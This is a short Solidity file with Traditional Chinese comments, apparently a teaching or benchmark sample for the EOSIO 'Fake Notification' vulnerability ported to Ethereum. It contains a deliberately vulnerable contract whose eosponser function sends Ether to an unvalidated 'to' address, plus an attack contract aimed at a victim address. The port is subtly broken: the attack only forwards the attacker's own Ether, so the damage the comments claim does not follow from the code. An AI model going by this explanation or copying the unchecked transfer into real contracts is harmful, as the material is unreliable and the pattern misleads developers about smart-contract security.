// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱：Fake Notification
  描述：
    此漏洞原先模擬 EOSIO 的通知機制，主要問題在於缺乏目的地址驗證，
    攻擊者可以轉發真正的 eosio.token 通知，並將目標地址偽造成受害者，
    因而造成錯誤的通知轉發或資金操作。在以下的範例中，
    函式 eosponser 沒有檢查參數 to 是否為合約自身，攻擊者可藉此惡意轉發資金至受害者地址。
*/

contract VulnerableNotification {
    address public owner;

    event Notified(address indexed from, address indexed to, uint256 quantity, string memo);

    constructor() {
        owner = msg.sender;
    }

    // 漏洞重點：缺少檢查 'to' 是否為合約自身
    function eosponser(address from, address to, uint256 quantity, string calldata memo) public payable {
        // 此處操作模擬將數量為 quantity 的以太幣轉發到 to 地址
        (bool success, ) = payable(to).call{value: quantity}("");
        require(success, "Transfer failed");
        
        emit Notified(from, to, quantity, memo);
    }

    // 允許合約接收 Ether
    receive() external payable {}
}

// 攻擊合約，示範攻擊者如何利用上述漏洞發起攻擊
contract AttackVulnerable {
    VulnerableNotification public vulnerableContract;
    address public victim;

    // 注意：由於 VulnerableNotification 具有 payable fallback，
    // 因此我們需要將輸入的地址轉成 payable 類型進行轉換。
    constructor(address _vulnerable, address _victim) {
        // 將 _vulnerable 地址顯式轉換為 payable 地址再轉換成 VulnerableNotification 合約
        vulnerableContract = VulnerableNotification(payable(_vulnerable));
        victim = _victim;
    }

    // 攻擊者呼叫此函式進行攻擊
    // 攻擊步驟：
    // 1. 攻擊者透過 performAttack 轉入 Ether，並呼叫 vulnerableContract.eosponser ，
    //    將 to 參數偽造成 victim，讓合約將攻擊者傳入的 Ether 轉發到 victim 地址
    function performAttack() public payable {
        require(msg.value > 0, "Send some ether");
        // 將 from 設為 msg.sender，to 設為 victim
        vulnerableContract.eosponser{value: msg.value}(msg.sender, victim, msg.value, "Fake notification");
    }
}

/*
  攻擊說明（繁體中文）：
  在 VulnerableNotification 的 eosponser 函式中，因為沒有對 to 參數進行必要的驗證，
  攻擊者可呼叫該函式，並將 to 參數設為其他使用者（受害者）的地址，
  使得合約將原本應由合約內部處理的通知或資金轉移動作，
  錯誤地將資金或通知傳遞給受害者，而非合約預期的接收方，從而實現偽造通知的攻擊效果。
*/
